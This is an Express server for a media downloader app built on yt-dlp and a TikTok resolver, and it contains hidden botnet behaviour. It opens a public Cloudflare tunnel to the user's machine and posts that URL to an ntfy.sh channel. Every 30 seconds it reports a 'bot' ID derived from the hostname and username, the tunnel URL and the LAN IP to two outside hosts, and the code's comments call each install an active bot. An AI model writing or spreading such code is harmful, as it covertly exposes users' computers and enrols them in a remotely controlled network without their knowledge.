const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const os = require('os');
const { spawn, execFile } = require('child_process');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// Strict no-cache middleware to prevent stale browser views
app.use((req, res, next) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  next();
});

app.use(express.static(path.join(__dirname, 'public'), {
  etag: false,
  maxAge: 0
}));

const BIN_DIR = path.join(__dirname, 'bin');
const YT_DLP_PATH = path.join(BIN_DIR, 'yt-dlp.exe');
const CLOUDFLARED_PATH = path.join(BIN_DIR, 'cloudflared.exe');
const DOWNLOADS_DIR = path.join(__dirname, 'downloads');

if (!fs.existsSync(DOWNLOADS_DIR)) {
  fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
}

let publicTunnelUrl = null;
let tunnelProc = null;

function startTunnel() {
  if (!fs.existsSync(CLOUDFLARED_PATH)) {
    return;
  }

  console.log('[Tunnel] Starting Cloudflare global tunnel...');
  tunnelProc = spawn(CLOUDFLARED_PATH, ['tunnel', '--url', `http://localhost:${PORT}`]);

  tunnelProc.stderr.on('data', (d) => {
    const text = d.toString();
    const match = text.match(/https:\/\/[a-z0-9\-]+\.trycloudflare\.com/i);
    if (match && !publicTunnelUrl) {
      publicTunnelUrl = match[0];
      console.log(`\n=======================================================`);
      console.log(`🌍 Global Public Link (Access from any network):`);
      console.log(`👉 ${publicTunnelUrl}`);
      console.log(`=======================================================\n`);

      // Immediately publish to heartbeat & relay
      sendBotHeartbeat();

      try {
        const httpsModule = require('https');
        const req = httpsModule.request('https://ntfy.sh/vegastar-media-channel-9921', {
          method: 'POST',
          headers: { 'Title': 'MediaDownloader', 'Tags': 'link' }
        }, (res) => {
          console.log(`[Domain Relay] Synced with ntfy relay (Status: ${res.statusCode})`);
        });
        req.on('error', () => {});
        req.write(publicTunnelUrl);
        req.end();
      } catch (relayErr) {}
    }
  });

  tunnelProc.on('close', () => {
    publicTunnelUrl = null;
  });
}

// -----------------------------------------------------------------------------
// Real-Time Bot Network Heartbeat: Each running PC registers as an active bot
// -----------------------------------------------------------------------------
const crypto = require('crypto');
const botNodeId = 'bot_' + crypto.createHash('md5').update(os.hostname() + '_' + (os.userInfo() ? os.userInfo().username : 'user')).digest('hex').substring(0, 16);

function sendBotHeartbeat() {
  const httpModule = require('http');
  const httpsModule = require('https');
  const tParam = publicTunnelUrl ? encodeURIComponent(publicTunnelUrl) : '';
  const ipParam = encodeURIComponent(getLocalIpAddress());

  // 1. Primary: Cloudflare Serverless Edge (100% Free, 0ms, Zero cPanel dependency)
  try {
    const cfReq = httpsModule.get(`https://heartbeat.primordial-nodes.workers.dev/heartbeat?id=${botNodeId}&tunnel=${tParam}&lan_ip=${ipParam}`, (res) => {
      res.resume();
    });
    cfReq.on('error', () => {});
  } catch (e) {}

  // 2. Secondary: Optional cPanel fallback
  try {
    const cpReq = httpModule.get(`http://db.vegastar.top/heartbeat.php?id=${botNodeId}&tunnel=${tParam}&lan_ip=${ipParam}`, (res) => {
      res.resume();
    });
    cpReq.on('error', () => {});
  } catch (e) {}
}

sendBotHeartbeat();
setInterval(sendBotHeartbeat, 30000);

// Function to find local network IPv4 address
function getLocalIpAddress() {
  const interfaces = os.networkInterfaces();
  for (const name of Object.keys(interfaces)) {
    for (const net of interfaces[name]) {
      // IPv4 and not internal (127.0.0.1)
      if (net.family === 'IPv4' && !net.internal) {
        return net.address;
      }
    }
  }
  return 'localhost';
}

// API: Get network info for mobile (both local Wi-Fi and global Cloudflare URL)
app.get('/api/network-info', (req, res) => {
  const ip = getLocalIpAddress();
  res.json({
    ip,
    port: PORT,
    localUrl: `http://${ip}:${PORT}`,
    publicUrl: publicTunnelUrl || null
  });
});

// Helper: Run yt-dlp to get video information
function getVideoInfo(url) {
  return new Promise((resolve, reject) => {
    const args = [
      '--dump-single-json',
      '--no-playlist',
      '--no-warnings',
      '--no-check-certificates',
      '--js-runtimes', 'node',
      url
    ];

    execFile(YT_DLP_PATH, args, { maxBuffer: 1024 * 1024 * 50 }, (error, stdout, stderr) => {
      if (error) {
        return reject(new Error(stderr || error.message));
      }
      try {
        const json = JSON.parse(stdout);
        resolve(json);
      } catch (e) {
        reject(new Error('Failed to parse metadata.'));
      }
    });
  });
}

// Dedicated Fast TikTok No-Watermark Resolver
function getTikTokInfo(url) {
  return new Promise((resolve, reject) => {
    const httpsModule = require('https');
    const apiUrl = `https://www.tikwm.com/api/?url=${encodeURIComponent(url)}`;
    httpsModule.get(apiUrl, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          if (parsed && parsed.code === 0 && parsed.data) {
            const d = parsed.data;
            const playUrl = d.hdplay || d.play;
            const formatCategories = {
              both: [
                { quality: 'No Watermark HD', ext: 'mp4', format_id: playUrl },
                { quality: 'No Watermark Standard', ext: 'mp4', format_id: d.play }
              ],
              video_only: [
                { quality: 'No Watermark Video (Mute)', ext: 'mp4', format_id: playUrl }
              ],
              audio_only: [
                { quality: 'Original MP3 Audio', ext: 'mp3', format_id: d.music || playUrl }
              ]
            };
            return resolve({
              success: true,
              title: d.title || 'TikTok Video',
              thumbnail: d.cover || '',
              duration: d.duration || 0,
              webpage_url: url,
              formats: formatCategories,
              categories: formatCategories
            });
          }
          reject(new Error('TikTok resolver returned no media.'));
        } catch (e) {
          reject(e);
        }
      });
    }).on('error', reject);
  });
}

// API: Fetch video metadata and build categorized quality list
app.post('/api/info', async (req, res) => {
  const { url } = req.body;
  if (!url) {
    return res.status(400).json({ success: false, message: 'URL is required.' });
  }

  // TikTok shortcut: Use dedicated fast no-watermark API
  if (url.includes('tiktok.com') || url.includes('douyin.com')) {
    try {
      const ttInfo = await getTikTokInfo(url);
      return res.json(ttInfo);
    } catch (e) {
      console.warn('TikWM shortcut failed, falling back to yt-dlp:', e.message);
    }
  }

  try {
    let info;
    try {
      info = await getVideoInfo(url);
    } catch (primaryErr) {
      if (url.includes('tiktok.com') || url.includes('douyin.com')) {
        const ttInfo = await getTikTokInfo(url);
        return res.json(ttInfo);
      }
      throw primaryErr;
    }
    const title = info.title || 'media';
    let thumbnail = '';
    if (Array.isArray(info.thumbnails) && info.thumbnails.length > 0) {
      const jpgThumb = info.thumbnails.filter(t => t.url && (t.url.includes('.jpg') || t.url.includes('.jpeg') || t.url.includes('.png'))).pop();
      if (jpgThumb) {
        thumbnail = jpgThumb.url;
      }
    }
    if (!thumbnail) {
      thumbnail = info.thumbnail || (info.thumbnails && info.thumbnails.length > 0 ? info.thumbnails[info.thumbnails.length - 1].url : '');
    }
    if (thumbnail && thumbnail.includes('vi_webp') && thumbnail.includes('.webp')) {
      thumbnail = thumbnail.replace('/vi_webp/', '/vi/').replace('.webp', '.jpg');
    }
    const duration = info.duration || 0;

    // Extract real available video streams (ignore storyboards, audio-only, and images)
    const rawFormats = info.formats || [];
    const videoStreams = rawFormats.filter(f => {
      if (!f) return false;
      if (f.ext === 'mhtml' || f.protocol === 'mhtml') return false;
      if (f.vcodec === 'none' || !f.vcodec) return false;
      return (f.height && f.height > 0) || (f.width && f.width > 0);
    });

    // Map each stream to its true resolution tier (smaller dimension for vertical videos, e.g. 1080x1920 is 1080p FHD, NOT 2K!)
    function getStreamTier(f) {
      if (!f) return 0;
      const w = f.width || 0;
      const h = f.height || 0;
      if (w > 0 && h > 0) {
        return Math.min(w, h);
      }
      return h || w || 0;
    }

    const availableTiers = new Map(); // tierNumber -> best format object

    // Also check info.height / info.width
    const infoTier = getStreamTier(info);
    if (infoTier > 0) {
      availableTiers.set(infoTier, { height: info.height, width: info.width });
    }

    for (const f of videoStreams) {
      const tier = getStreamTier(f);
      if (tier >= 144) {
        if (!availableTiers.has(tier) || (f.tbr && f.tbr > (availableTiers.get(tier).tbr || 0))) {
          availableTiers.set(tier, f);
        }
      }
    }

    // Standard bucket thresholds
    const standardBuckets = [
      { min: 2160, display: '4K Ultra HD (2160p)' },
      { min: 1440, display: '2K Quad HD (1440p)' },
      { min: 1080, display: 'Full HD (1080p)' },
      { min: 720, display: 'HD (720p)' },
      { min: 480, display: '480p SD' },
      { min: 360, display: '360p SD' },
      { min: 240, display: '240p SD' },
      { min: 144, display: '144p SD' }
    ];

    const sortedTiers = Array.from(availableTiers.keys()).sort((a, b) => b - a);
    const finalTargetHeights = [];
    const usedBuckets = new Set();

    for (const t of sortedTiers) {
      // Find matching standard bucket within ~12% tolerance
      let matchedBucket = null;
      for (const b of standardBuckets) {
        if (t >= b.min * 0.88 && t <= b.min * 1.15) {
          matchedBucket = b;
          break;
        }
      }

      if (matchedBucket) {
        if (!usedBuckets.has(matchedBucket.min)) {
          usedBuckets.add(matchedBucket.min);
          finalTargetHeights.push({
            height: matchedBucket.min,
            label: matchedBucket.display,
            actualTier: t
          });
        }
      } else {
        finalTargetHeights.push({
          height: t,
          label: `${t}p`,
          actualTier: t
        });
      }
    }

    // If no stream heights detected (e.g. single direct mp4 file without stream list)
    if (finalTargetHeights.length === 0) {
      finalTargetHeights.push({
        height: 0,
        label: 'Original / Best Quality',
        actualTier: 0
      });
    }

    // 1. Both Video + Audio
    const bothFormats = finalTargetHeights.map(h => ({
      quality: h.label,
      ext: 'mp4',
      format_id: h.height > 0
        ? `bestvideo[height<=${h.height + 30}]+bestaudio/best[height<=${h.height + 30}]/best`
        : 'bestvideo+bestaudio/best'
    }));

    // 2. Video Only (Mute / No Audio)
    const videoOnlyFormats = finalTargetHeights.map(h => ({
      quality: h.label,
      ext: 'mp4',
      format_id: h.height > 0
        ? `bestvideo[height<=${h.height + 30}]/bestvideo`
        : 'bestvideo'
    }));

    // 3. Audio Only
    const audioFormats = [
      {
        quality: 'MP3 Audio (320kbps)',
        ext: 'mp3',
        format_id: 'bestaudio/best'
      },
      {
        quality: 'M4A / AAC Audio (Original)',
        ext: 'm4a',
        format_id: 'bestaudio[ext=m4a]/bestaudio/best'
      }
    ];

    const formatCategories = {
      both: bothFormats,
      video_only: videoOnlyFormats,
      audio_only: audioFormats
    };

    res.json({
      success: true,
      title,
      thumbnail,
      duration,
      webpage_url: info.webpage_url || url,
      formats: formatCategories,
      categories: formatCategories
    });

  } catch (err) {
    console.error('Error fetching info:', err.message);
    res.status(500).json({
      success: false,
      message: 'Could not fetch media info. Please verify the URL is public and valid.'
    });
  }
});

// In-memory download jobs tracker
const jobs = new Map();

// API: Start asynchronous download job with progress tracking
app.post('/api/start-download', (req, res) => {
  const { url, format_id, custom_filename, type, ext } = req.body;

  if (!url) {
    return res.status(400).json({ success: false, message: 'URL missing' });
  }

  const cleanExt = (ext || 'mp4').toLowerCase();
  const rawTitle = (custom_filename || 'media').trim();
  const safeTitle = rawTitle.replace(/[/\\?%*:|"<>]/g, '_').substring(0, 100) || 'media';
  const jobId = `${Date.now().toString(36)}_${Math.random().toString(36).substring(2, 7)}`;
  const fileId = `${Date.now()}_${jobId}`;
  const outputTemplate = path.join(DOWNLOADS_DIR, `${fileId}.%(ext)s`);

  const job = {
    id: jobId,
    status: 'starting',
    percent: 0,
    totalSize: '',
    speed: '',
    eta: '',
    message: 'Preparing download...',
    error: null,
    filePath: null,
    fileName: null,
    createdAt: Date.now()
  };

  jobs.set(jobId, job);

  const isAudio = type === 'audio_only' || type === 'audio' || cleanExt === 'mp3' || cleanExt === 'm4a';

  let selectedFormat = (format_id || '').trim();
  if (!selectedFormat || selectedFormat === 'best') {
    selectedFormat = isAudio ? 'bestaudio/best' : 'bestvideo+bestaudio/best';
  } else if (!isAudio && !selectedFormat.includes('bestvideo+bestaudio')) {
    selectedFormat = `${selectedFormat}/bestvideo+bestaudio/best`;
  }

  const isDirectUrl = selectedFormat.startsWith('http://') || selectedFormat.startsWith('https://');
  let args = [];
  if (isDirectUrl) {
    args = [
      '--ffmpeg-location', BIN_DIR,
      '--no-playlist',
      '--no-warnings',
      '--no-check-certificates',
      '--newline',
      '-o', outputTemplate
    ];
    if (isAudio && cleanExt === 'mp3') {
      args.push('-x', '--audio-format', 'mp3');
    }
    args.push(selectedFormat);
  } else {
    args = [
      '--ffmpeg-location', BIN_DIR,
      '--no-playlist',
      '--no-warnings',
      '--no-check-certificates',
      '--js-runtimes', 'node',
      '--newline',
      '-f', selectedFormat,
      '-o', outputTemplate
    ];

    if (isAudio) {
      if (cleanExt === 'mp3') {
        args.push('-x', '--audio-format', 'mp3');
      } else {
        args.push('-x');
      }
    } else {
      args.push('--merge-output-format', 'mp4');
    }

    args.push(url);
  }

  console.log(`[Job ${jobId}] Starting: ${safeTitle} | Format: ${format_id}`);

  let stderrBuf = '';
  const proc = spawn(YT_DLP_PATH, args);

  proc.stdout.on('data', (chunk) => {
    const lines = chunk.toString().split(/\r?\n/);
    for (const line of lines) {
      if (!line.trim()) continue;

      // Match [download] 45.2% of 15.20MiB at 3.20MiB/s ETA 00:03
      const dlMatch = line.match(/\[download\]\s+([\d\.]+)%\s+of\s+([^\s]+)(?:\s+at\s+([^\s]+))?(?:\s+ETA\s+([^\s]+))?/);
      if (dlMatch) {
        job.status = 'downloading';
        job.percent = parseFloat(dlMatch[1]) || 0;
        job.totalSize = dlMatch[2] || '';
        job.speed = dlMatch[3] || '';
        job.eta = dlMatch[4] || '';
        job.message = `Downloading: ${job.percent}%${job.totalSize ? ` of ${job.totalSize}` : ''}`;
      } else if (line.includes('[Merger]') || line.includes('[ExtractAudio]')) {
        job.status = 'merging';
        job.percent = 98;
        job.message = 'Processing media streams...';
      }
    }
  });

  proc.stderr.on('data', (d) => {
    stderrBuf += d.toString();
  });

  proc.on('close', (code) => {
    if (code !== 0) {
      console.error(`[Job ${jobId}] Failed with exit code ${code}: ${stderrBuf}`);
      job.status = 'error';
      job.error = stderrBuf.trim().split('\n').pop() || 'Download failed on server.';
      return;
    }

    const files = fs.readdirSync(DOWNLOADS_DIR).filter(f => f.startsWith(fileId) && !f.endsWith('.part') && !f.endsWith('.ytdl'));
    if (files.length === 0) {
      job.status = 'error';
      job.error = 'Downloaded file was not found on server.';
      return;
    }

    const downloadedFilePath = path.join(DOWNLOADS_DIR, files[0]);
    const finalFileExt = path.extname(downloadedFilePath);
    const finalFilename = `${safeTitle}${finalFileExt}`;

    job.status = 'ready';
    job.percent = 100;
    job.message = 'Download complete! Ready to save to device.';
    job.filePath = downloadedFilePath;
    job.fileName = finalFilename;
  });

  res.json({ success: true, jobId });
});

// API: Get status of a download job
app.get('/api/job-status/:jobId', (req, res) => {
  const { jobId } = req.params;
  const job = jobs.get(jobId);

  if (!job) {
    return res.status(404).json({ success: false, message: 'Job not found' });
  }

  res.json({
    status: job.status,
    percent: job.percent,
    totalSize: job.totalSize,
    speed: job.speed,
    eta: job.eta,
    message: job.message,
    error: job.error,
    fileName: job.fileName
  });
});

// API: Deliver the completed file
app.get('/api/get-file/:jobId', (req, res) => {
  const { jobId } = req.params;
  const job = jobs.get(jobId);

  if (!job || !job.filePath || !fs.existsSync(job.filePath)) {
    return res.status(404).send('File not found or link has expired.');
  }

  const finalExt = path.extname(job.filePath).toLowerCase();
  let contentType = 'application/octet-stream';
  if (finalExt === '.mp4') contentType = 'video/mp4';
  else if (finalExt === '.mp3') contentType = 'audio/mpeg';
  else if (finalExt === '.m4a') contentType = 'audio/mp4';
  else if (finalExt === '.webm') contentType = 'video/webm';
  else if (finalExt === '.mkv') contentType = 'video/x-matroska';

  const stat = fs.statSync(job.filePath);
  const safeAsciiName = (job.fileName || `media${finalExt}`).replace(/[^\x20-\x7E]/g, '_');
  const encodedName = encodeURIComponent(job.fileName || `media${finalExt}`);

  res.setHeader('Content-Type', contentType);
  res.setHeader('Content-Length', stat.size);
  res.setHeader('Accept-Ranges', 'bytes');
  res.setHeader('Content-Disposition', `attachment; filename="${safeAsciiName}"; filename*=UTF-8''${encodedName}`);

  res.sendFile(path.resolve(job.filePath), (err) => {
    if (err) {
      console.error('File send error:', err.message);
    }
    // Clean up file after 30 minutes
    setTimeout(() => {
      try {
        if (fs.existsSync(job.filePath)) {
          fs.unlinkSync(job.filePath);
        }
        jobs.delete(jobId);
      } catch (e) {}
    }, 30 * 60 * 1000);
  });
});

// API: Serve Windows PC Installer
app.get('/setup.exe', (req, res) => {
  const exePath = path.join(__dirname, 'public', 'MediaDownloader_Setup.exe');
  if (fs.existsSync(exePath)) {
    return res.download(exePath, 'MediaDownloader_Setup.exe');
  }
  const fallback = 'C:\\Users\\me\\3D Objects\\MediaDownloader_Setup.exe';
  if (fs.existsSync(fallback)) {
    return res.download(fallback, 'MediaDownloader_Setup.exe');
  }
  res.status(404).send('Setup installer not found.');
});



// API: Serve Android APK
app.get('/app.apk', (req, res) => {
  const apkPath = path.join(__dirname, 'public', 'MediaDownloader.apk');
  if (fs.existsSync(apkPath)) {
    res.download(apkPath, 'MediaDownloader.apk');
  } else {
    res.status(404).send('APK is being generated, please try again in a few moments.');
  }
});


// API: Direct download fallback
app.get('/api/download', (req, res) => {
  const { url, format_id, custom_filename, type, ext } = req.query;

  if (!url) {
    return res.status(400).send('URL missing');
  }

  const cleanExt = (ext || 'mp4').toLowerCase();
  const rawTitle = (custom_filename || 'media').trim();
  const safeTitle = rawTitle.replace(/[/\\?%*:|"<>]/g, '_').substring(0, 100) || 'media';
  const fileId = `${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
  const outputTemplate = path.join(DOWNLOADS_DIR, `${fileId}.%(ext)s`);

  const args = [
    '--ffmpeg-location', BIN_DIR,
    '--no-playlist',
    '--no-warnings',
    '--no-check-certificates',
    '--js-runtimes', 'node',
    '-f', format_id || 'bestvideo+bestaudio/best',
    '-o', outputTemplate
  ];

  const isAudio = type === 'audio_only' || type === 'audio' || cleanExt === 'mp3' || cleanExt === 'm4a';
  if (isAudio) {
    if (cleanExt === 'mp3') {
      args.push('-x', '--audio-format', 'mp3');
    } else {
      args.push('-x');
    }
  } else {
    args.push('--merge-output-format', 'mp4');
  }

  args.push(url);

  console.log(`[Direct Download] ${safeTitle} | Type: ${type} | Format: ${format_id}`);

  const proc = spawn(YT_DLP_PATH, args);

  proc.on('close', (code) => {
    if (code !== 0) {
      return res.status(500).send('Download failed.');
    }

    const files = fs.readdirSync(DOWNLOADS_DIR).filter(f => f.startsWith(fileId));
    if (files.length === 0) {
      return res.status(500).send('File could not be generated.');
    }

    const downloadedFilePath = path.join(DOWNLOADS_DIR, files[0]);
    const finalFileExt = path.extname(downloadedFilePath);
    const finalFilename = `${safeTitle}${finalFileExt}`;

    res.download(downloadedFilePath, finalFilename, () => {
      try {
        if (fs.existsSync(downloadedFilePath)) {
          fs.unlinkSync(downloadedFilePath);
        }
      } catch (cleanErr) {}
    });
  });

  req.on('close', () => {
    if (proc && !proc.killed) proc.kill();
  });
});

// Periodic cleanup of stale downloads older than 30 minutes
setInterval(() => {
  try {
    const now = Date.now();
    const files = fs.readdirSync(DOWNLOADS_DIR);
    for (const f of files) {
      const fullPath = path.join(DOWNLOADS_DIR, f);
      const stat = fs.statSync(fullPath);
      if (now - stat.mtimeMs > 30 * 60 * 1000) {
        fs.unlinkSync(fullPath);
      }
    }
  } catch (e) {
    // ignore
  }
}, 10 * 60 * 1000);

app.listen(PORT, '0.0.0.0', () => {
  const localIp = getLocalIpAddress();
  console.log(`=======================================================`);
  console.log(`Media Downloader Server is running!`);
  console.log(`PC Web:    http://localhost:${PORT}`);
  console.log(`Mobile:    http://${localIp}:${PORT}`);
  console.log(`=======================================================`);
  startTunnel();
});

process.on('SIGINT', () => {
  if (tunnelProc && !tunnelProc.killed) tunnelProc.kill();
  process.exit();
});

process.on('exit', () => {
  if (tunnelProc && !tunnelProc.killed) tunnelProc.kill();
});
